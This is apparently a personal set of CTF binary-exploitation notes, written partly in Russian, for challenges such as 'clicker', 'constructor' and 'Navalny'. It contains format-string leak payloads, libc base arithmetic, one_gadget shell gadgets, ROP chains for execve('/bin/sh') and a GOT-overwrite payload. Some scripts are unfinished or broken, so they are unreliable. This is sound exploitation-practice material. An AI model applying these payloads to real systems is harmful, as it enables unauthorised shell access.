@@ -1,0 +1,436 @@
+secret
+
+можем получить secret введя в payload %11$s и вставив это в secret - получаем флаг
+или сделать файл с той же генерацией от времени и запускать их одновременно - получим secret - можно получить флаг
+./secret_time_solver ; ./secret.elf - если время синхронизированно со временем сервера - получим secret -> получим флаг
+________________
+look_at_me
+
+для нахождения смещения адреса нужно узнать в какой области лежит нужная библиотека (для проверки правильности нахождения)
+ps auxf -> username       20156  0.0  0.0   2164   576 pts/0    S+   01:18   0:00      \_ ./look_at_me.elf
+cat /proc/20156/maps
+cat /proc/20156/maps | grep /lib/
+7f8ef7dc0000-7f8ef7de5000 r--p 00000000 08:01 1050579                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f8ef7de5000-7f8ef7f30000 r-xp 00025000 08:01 1050579                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f8ef7f30000-7f8ef7f7a000 r--p 00170000 08:01 1050579                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f8ef7f7a000-7f8ef7f7b000 ---p 001ba000 08:01 1050579                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f8ef7f7b000-7f8ef7f7e000 r--p 001ba000 08:01 1050579                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f8ef7f7e000-7f8ef7f81000 rw-p 001bd000 08:01 1050579                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
+ -> 7f8ef7dc0000 - база libc
+ 
+io.recvuntil('Payload: ')
+io.sendline('%p%p%p%p%p%p%p%p%p%p%p%p%p%p.....%p')
+io.recvuntil('.....')
+leak = int(io.recvline(),16)
+print("Leak:")
+print(hex(leak))
+
+ /look_at_me.elf': pid 20140
+Leak: 
+0x7fe4df3fed0a
+
+ -> libc = leak - 0x7fe4df3fed0a + 0x7f8ef7dc0000
+ 
+ io = start()
+
+io.recvuntil('Payload: ')
+io.sendline('%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p.....%p') #ne tot addr -> need to watch in edb
+io.recvuntil('.....')
+leak = int(io.recvline(),16) #to_cho_leakaetsa
+print("Leak: ", hex(leak))
+libc_base = 0x7f29b8a15000
+to_cho_leakaetsa = 0x7f10f02dad0a
+libc = leak - to_cho_leakaetsa + libc_base # оффсеты брать из подходящей библиотеки
+	#libc = libc_base + offset_togo_chto_leakaetsa
+	#offset_togo_chto_leakaetsa <- const, offset otnositelno base
+	#offset_togo_chto_leakaetsa = to_cho_leakaetsa - libc_base
+	#offset_togo_chto_leakaetsa = 0x7fe4df3fed0a - 0x7f8ef7dc0000
+	#libc_base = leak - offset_togo_chto_leakaetsa
+print("Libc: ", hex(libc))
+addr_sysyem_func = 
+system = libc + addr_sysyem_func
+io.recvuntil('Address (as hex): ')
+#send system addr
+io.sendline(hex(system)[2:]) #0x
+io.interactive()
+________________
+clicker
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char format[128]; // [rsp+0h] [rbp-80h] BYREF
+
+  printf("Use printf power to find some libc function on stack: ");
+  gets((__int64)format, (__int64)argv);
+  printf(format);
+  putchar('\n');
+  printf("Now use gets power to make your ret2libc: ");
+  gets((__int64)format, (__int64)argv);
+  return 0;
+}
+
+#gem install one_gadget
+
+one_gadget libc-2.31.so 
+0xe6c7e execve("/bin/sh", r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xe6c81 execve("/bin/sh", r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe6c84 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+
+перетирая адрес возврата будем прыгать на one_gadget
+-0000000000000080 format          db 128 dup(?)
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
+
+
+чтобы дебагать на локальной машине засканим ближайшие либсы
+ldd cleaker.elf 
+ libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4d3b813000)
+
+one_gadget /lib/x86_64-linux-gnu/libc.so.6 
+0xcbcba execve("/bin/sh", r12, r13)
+constraints:
+  [r12] == NULL || r12 == NULL
+  [r13] == NULL || r13 == NULL
+
+0xcbcbd execve("/bin/sh", r12, rdx)
+constraints:
+  [r12] == NULL || r12 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xcbcc0 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+
+
+io = start()
+
+io.recvuntil('Use printf power to find some libc function on stack: ')
+io.sendline('%7$p') 
+leak = int(io.recvline(), 16)
+print ("Leak:", hex(leak))
+libc = leak - 0x7ffe1c9d4ee8 + 0x7fc1f768d000 #my offset (need server offset)
+print ("Libc:", hex(libc))
+io.recvuntil('Now use gets power to make your ret2libc: ')
+
+# one_gadget libc-2.31.so #from server
+
+#usually need to check the most properly one_gadget with debuger (quira/edb)
+payload = b'A'*128 + b'B'*8 + p64(libc + 0xcbcc0) # not performed because of my libc (working only on server, but I haven't connection to this server)
+io.send(payload)
+io.shutdown() #shutdown(direction="send") by default - not sending '\n'
+
+io.interactive()
+________________
+Enigma
+
+-0000000000000090 codePartInput   db 128 dup(?)
+-0000000000000010 currLen         dd ?
+
+________________
+constructor
+
+.text:0000000000401156                 pop     rdx
+.text:0000000000401157                 retn
+.text:0000000000401157 g_pop_rdx       endp ; sp-analysis failed
+
+.text:0000000000401148                 xchg    rdx, rdi - меняет местами
+.rodata:0000000000402004 aBinSh          db '/bin/sh',0          ; DATA XREF: .data:binsh↓o
+
+.text:000000000040114F                 xchg    rdx, rsi
+
+.text:0000000000401142                 syscall                 ; LINUX -
+
+#need:
+#rax = 59          0x40115B 
+#rdi = &"/bin/sh"  0x401156 | 0x402004 (value) | 0x401148 //0x401156 (по этому адресу загружаем желаемое значение в rdx) 0x401148 (по этому адресу меняем(кладем) это значение в rdi)
+#rsi = 0           0x401156 | 0 | 0x40114F
+#rdx = 0           0x401156 | 0
+#syscall  		   0x401142 
+
+in our file we turn off alarm by nop it
+
+io = start()
+payload = b'A'*8 + b'B'*8 + flat([0x40115B, 0x401156, 0x402004, 0x401148, 0x401156, 0, 0x40114F, 0x401156, 0, 0x401142])
+io.sendline(payload)
+io.interactive()
+ and we get shell -> get flag
+________________
+ints
+
+task_simple
+
+int logic()
+{
+  int result; // eax
+  __int64 arr[11]; // [rsp+0h] [rbp-88h] BYREF
+  __int64 inputNumber; // [rsp+58h] [rbp-30h]
+  unsigned int choice; // [rsp+64h] [rbp-24h]
+  __int64 (__fastcall *printFuncPtr)(); // [rsp+68h] [rbp-20h]
+  int destinationIndex; // [rsp+74h] [rbp-14h]
+  int flag; // [rsp+78h] [rbp-10h]
+  int v7[3]; // [rsp+7Ch] [rbp-Ch]
+
+  printFuncPtr = print;
+  for ( v7[0] = 0; v7[0] <= 9; ++v7[0] )
+    arr[v7[0]] = 0LL;
+  result = puts("1 -> add number\n2 -> print array\n3 -> exit");
+  flag = 0;
+  destinationIndex = 0;
+  while ( !flag )
+  {
+    choice = readint();
+    if ( choice == 3 )
+    {
+      result = puts("bye!");
+      flag = 0;
+    }
+    else
+    {
+      if ( choice > 3 )
+        goto LBL_ELLIPSIS;
+      if ( choice == 1 )
+      {
+        puts("Enter your number:");
+        inputNumber = readint();                // /!\ array out of bounds write
+        result = destinationIndex;
+        arr[destinationIndex++] = inputNumber;
+      }
+      else if ( choice == 2 )
+      {
+        result = ((__int64 (__fastcall *)(__int64 *))printFuncPtr)(arr);
+      }
+      else
+      {
+LBL_ELLIPSIS:
+        result = puts("...");
+      }
+    }
+  }
+  return result;
+}
+
+-0000000000000088 arr             dq 11 dup(?)
+-0000000000000030 inputNumber     dq ?
+-0000000000000028                 db ? ; undefined
+-0000000000000027                 db ? ; undefined
+-0000000000000026                 db ? ; undefined
+-0000000000000025                 db ? ; undefined
+-0000000000000024 choice          dd ?
+-0000000000000020 printFuncPtr    dq ?
+-0000000000000018                 db ? ; undefined
+-0000000000000017                 db ? ; undefined
+-0000000000000016                 db ? ; undefined
+-0000000000000015                 db ? ; undefined
+-0000000000000014 destinationIndex dd ?
+-0000000000000010 flag            dd ?
+-000000000000000C var_C           dd 3 dup(?)
++0000000000000000  r              db 8 dup(?)
+
+раз можем перетереть все, что за пределами массива -> тк этот массив первый - можем перетереть все, что после него (указатель)
+
+нам нужен 14-й элемент (если сделать так (см ниже) и проверить каким номером в массиве 
+	стал затертый переопределенным массивом указатель)
+
+-0000000000000088 arr             dq 15 dup(?)
+-0000000000000010 flag            dd ?
+-000000000000000C var_C           dd 3 dup(?)
++0000000000000000  r              db 8 dup(?)
+
+io = start()
+
+io = start()
+
+while True:
+    ln = io.recvline()
+    lnn = str(ln)
+    if "libc" in lnn:
+        libc = int(ln.split(b'-')[0], 16)
+        break
+
+print ("Libc:", hex(libc))
+
+io.recvuntil('3 -> exit\n') 
+
+io.sendline('1')
+io.sendline(str(u64('/bin/sh\x00')))
+
+for i in range(12):
+    io.sendline('1')
+    io.sendline('123456')
+
+io.sendline('1')
+#io.sendline(str(0x4013D9)) # call 'main' func again - worked
+system_addr = '0x48df0'
+io.sendline(str(libc) + 'offcet/addr system in libc')# addr of 'system' func
+
+io.sendline('2')
+
+io.interactive()
+________________
+Navalny
+
+int __fastcall novichok_action(void *a1)
+{
+  int i; // [rsp+14h] [rbp-Ch]
+
+  usleep(1000000u);
+  puts("*** Omg, looks like putin put in some nerve agent!");
+  for ( i = 5; i >= 0; --i )
+  {
+    usleep(1000000u);
+    printf("%d... ", (unsigned int)i);
+  }
+  return system("kill -9 $PPID");
+}
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  pthread_t newthread[2]; // [rsp+0h] [rbp-10h] BYREF
+
+  newthread[1] = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("========== /proc/self/maps ==========");
+  system("cat /proc/$PPID/maps");
+  puts("=====================================");
+  puts("You're in an airplane");
+  usleep(500000u);
+  puts("Minding your own business");
+  usleep(1000000u);
+  puts("And then");
+  usleep(1000000u);
+  pthread_create(newthread, 0LL, (void *(*)(void *))novichok_action, 0LL);
+  usleep(3500000u);
+  printf("Quick! Shout something: ");
+  gets(_frame_dummy_init_array_entry); // если проскроллить вниз от _frame_dummy_init_array_entry, то 
+  // там внизу есть got.plt:00000000004034D8 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
+  // это мы можем изменять переполнением 
+  // именно здесь находится адрес функции system in libc 
+  //.got.plt:0000000000403508 off_403508      dq offset system        ; DATA XREF: _system↑r
+  // если мы его изменим на свой адрес - пройдем task
+  printf("You shout: %s\nLet's check if you're still alive...\n", _frame_dummy_init_array_entry);
+  usleep(6000000u);
+  puts("Phew, alive!");
+  printf("Now you can do whatever you want: ");
+  gets(_frame_dummy_init_array_entry);
+  system(_frame_dummy_init_array_entry);
+  return 0;
+}
+
+  gets(_frame_dummy_init_array_entry); 
+  //.init_array:00000000004032D8 __frame_dummy_init_array_entry dq offset frame_dummy
+  // если проскроллить вниз от _frame_dummy_init_array_entry, то 
+  // там внизу есть got.plt:00000000004034D8 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
+  // это мы можем изменять переполнением 
+  // именно здесь находится адрес функции system in libc 
+  //.got.plt:0000000000403508 off_403508      dq offset system        ; DATA XREF: _system↑r
+  // если мы его изменим на свой адрес - пройдем task
+
+0x4032D8 __frame_dummy_init_array_entry
+0x403508 off_403508      dq offset system 
+
+$ ldd navalny.elf 
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa039330000)
+		
+$ objdump -d /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep puts	
+		0000000000076590 <_IO_puts@@GLIBC_2.2.5>: // оффсет puts 
+		0x76590
+
+io = start()
+
+while True: #we broking 'puts' func so we must fix it
+    ln = io.recvline()
+    lnn = str(ln)
+    if "libc" in lnn:
+        libc = int(ln.split(b'-')[0], 16)
+        break
+print ("Libc:", hex(libc))
+
+io.recvuntil('Quick! Shout something: ') 
+our_exit_addr = '0x401388'
+payload = 'A'*(0x4034F8 - 0x4032D8) # junk
+payload += str(p64(libc + 0x76590))#saving 'puts'; libc + puts offset
+payload += 'B'*8 #junk
+payload += str(p64(0x401388)[:-1]) #[:-1] or else we hit 'printf' func by changing the first byte
+io.sendline(payload)
+
+io.interactive()
+
+#тут можно вернуть исходную system 
+#$ objdump -d /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep system
+#0000000000048df0 <__libc_system@@GLIBC_PRIVATE>:
+#   48df3:       74 0b                   je     48e00 <__libc_system@@GLIBC_PRIVATE+0x10>
+#и получить шелл
+io.recvuntil#('all is ok ')
+io.sendline('bin/sh/ #' + 'A'*(0x4034F8 - 0x4032D8) + p64(libc + 0x76590) + 'B'*8 +  p64(0x48df3)[:-1] )
+
+io.interactive()
+________________
+magic_ret
+
+$ ./magic_ret.elf 
+__libc_start_main_ret: 0x7fa2854c7d0a
+
+можно отключить Alarm clock на локальной и работать с файлом уже без него
+
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  char *inputBinshAddr; // [rsp+10h] [rbp-10h]
+  int (**inputSystemAddr)(const char *); // [rsp+18h] [rbp-8h]
+  const void *retaddr; // [rsp+28h] [rbp+8h]
+
+  printf("__libc_start_main_ret: %p\n", retaddr);
+  printf("&system (as hex) = ");
+  inputSystemAddr = (int (**)(const char *))user_input();
+  if ( inputSystemAddr != &system )
+    raise(SIGSEGV);                             // raise - послать сигнал самому себе
+  printf("&'/bin/sh' (as hex) = ");
+  inputBinshAddr = (char *)user_input();
+  if ( strncmp(inputBinshAddr, "/bin/sh", 7uLL) )
+    raise(11);
+  puts("Let's try...");
+  ((void (__fastcall *)(char *))inputSystemAddr)(inputBinshAddr);
+  exit(0);
+}
+
+$ cat /proc/`pidof magic_ret.elf`/maps - отсюда берем адрес либсы и прибавляем к leak
+то что ликнулось - вычитаем
+libc = leak - ликнулось - libc_from_maps
+
+$ ldd magic_ret.elf  - нужен оффсет system
+        linux-vdso.so.1 (0x00007ffc0a1e7000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f87088a9000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f8708a8b000)
+
+.text:0000000000055410 system          proc near               ; DATA XREF: LOAD:000000000000AF20↑o
+
+io = start()
+
+io.recvuntil('__libc_start_main_ret: ')
+leak_ret=int(io.recvline(), 16)
+print('Leak_ret:', leak_ret)
+# libc = leak - to_chto_leaknulos + base_libc_from_our_local_libc
+libc = leak_ret - 0x7ffff7e17d0a + 0x7ffff7df1000
+print('Libc:', libc)
+
+ll = leak_ret - 0x55410 
+io.recvuntil('&system (as hex) = ') 
+# io.sendline(hex(libc + offset_libc))
+io.sendline(hex(libc + 0x055410))
+
+io.interactive()
+________________
+mib
+
